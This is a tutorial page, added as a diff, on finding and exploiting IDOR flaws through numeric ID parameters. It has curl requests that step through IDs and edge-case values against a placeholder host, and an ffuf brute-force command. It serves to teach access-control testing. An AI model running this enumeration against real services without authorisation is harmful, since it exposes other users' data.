@@ -1,0 +1,119 @@
+---
+title: Numeric Value Parameter in IDOR Exploitation
+description: Learn techniques to exploit IDOR vulnerabilities through numeric value
+  parameters in web applications, including manual and automated enumeration.
+keywords:
+- Numeric Value Parameter
+- IDOR
+- Web Security
+- Numerical Enumeration
+- Access Control
+- Security Exploitation
+- Hexadecimal ID
+- Epoch Timestamp
+- Vulnerability Testing
+---
+
+# Numeric Value Parameter
+
+## Context
+
+In web applications, vulnerabilities associated with numeric value parameters can lead to significant security risks if not properly controlled. Such vulnerabilities fall within the realm of Insecure Direct Object References (IDOR), where numeric identifiers are exploited to access unauthorized objects. This tutorial aims to demonstrate the techniques used to exploit these vulnerabilities by manipulating numeric value parameters. Assumed knowledge includes an understanding of numeric identifiers, basic parameter handling, access control mechanisms, and the broader concept of IDOR.
+
+## Theory
+
+### Numeric Value Parameters in Web Applications
+
+Numeric value parameters are commonly used as identifiers within web applications. These identifiers are typically integer-based and are passed within URLs or HTTP requests, such as `id=123`. The simplicity and predictability of sequential numeric IDs make them convenient for development. However, they can also pose security risks when not adequately safeguarded, leading to potential unauthorized access to resources.
+
+### Attack Surface: Numeric ID Enumeration
+
+When numeric value parameters lack proper access control, they become susceptible to enumeration attacks. An attacker can increment or decrement the numeric IDs within the request to access resources not meant for them. By modifying these values strategically, attackers can reveal unauthorized objects or data.
+
+The attack often starts by sending requests with known IDs and incrementally adjusting them to discover more accessible resources. Additionally, using edge-case values such as negative numbers or extremely large integers can reveal logic flaws or even bypass mechanisms.
+
+### Variants of Numeric Parameters
+
+Numeric parameters may not always be in a straightforward decimal format. Hexadecimal representations or epoch timestamps are also used in some applications. Understanding the different formats is crucial as they may process or validate differently in the backend. Identifying and manipulating these variants enable attackers to discover weaknesses in how an application handles and protects its resources.
+
+## Practice
+
+### Manual Numeric ID Enumeration and Exploitation
+
+Manual exploitation involves directly manipulating numeric IDs to test an application's security controls. Follow these steps to manually enumerate and identify potential vulnerabilities:
+
+- Use `curl` to make an initial request with a known numeric ID:
+
+    ```bash
+    curl -i 'https://target-app.com/resource?id=1'
+    ```
+    _Request resource with a known or guessed numeric ID._
+
+- Increment the ID to test for unauthorized access:
+
+    ```bash
+    curl -i 'https://target-app.com/resource?id=2'
+    ```
+    _Increment ID to test for unauthorized access._
+
+- Continue the increment to enumerate accessible objects:
+
+    ```bash
+    curl -i 'https://target-app.com/resource?id=3'
+    ```
+    _Continue incrementing to enumerate accessible objects._
+
+- Test an edge-case value (zero):
+
+    ```bash
+    curl -i 'https://target-app.com/resource?id=0'
+    ```
+    _Test edge-case value (zero)._
+
+- Test a negative value for logic flaws:
+
+    ```bash
+    curl -i 'https://target-app.com/resource?id=-1'
+    ```
+    _Test negative value for logic flaws._
+
+- Test large integer for overflow or bypass attempts:
+
+    ```bash
+    curl -i 'https://target-app.com/resource?id=2147483647'
+    ```
+    _Test large integer for overflow or bypass._
+
+- Test hexadecimal representation if accepted by the application:
+
+    ```bash
+    curl -i 'https://target-app.com/resource?id=0x10'
+    ```
+    _Test hexadecimal representation if accepted._
+
+- Test epoch timestamp if you suspect that format is being used:
+
+    ```bash
+    curl -i 'https://target-app.com/resource?id=1672531200'
+    ```
+    _Test epoch timestamp if format is suspected._
+
+Successful execution of these steps might allow access to sensitive data or resources not initially provisioned for unauthorized users.
+
+### Automated Numeric ID Bruteforce with ffuf
+
+Automation can enhance the speed and efficiency of numeric ID enumeration. The following steps use `ffuf` to automate this process:
+
+- Use `ffuf` to brute force numeric IDs using a wordlist of numbers:
+
+    ```bash
+    ffuf -u 'https://target-app.com/resource?id=FUZZ' -w /usr/share/wordlists/numbers.txt -mc 200
+    ```
+    _Automate numeric ID enumeration using a wordlist of numbers._
+
+This automated technique can rapidly discover accessible resources through thorough numeric parameter fuzzing, potentially revealing unauthorized access to sensitive data.
+
+## Tools
+
+- **curl**
+- **ffuf**
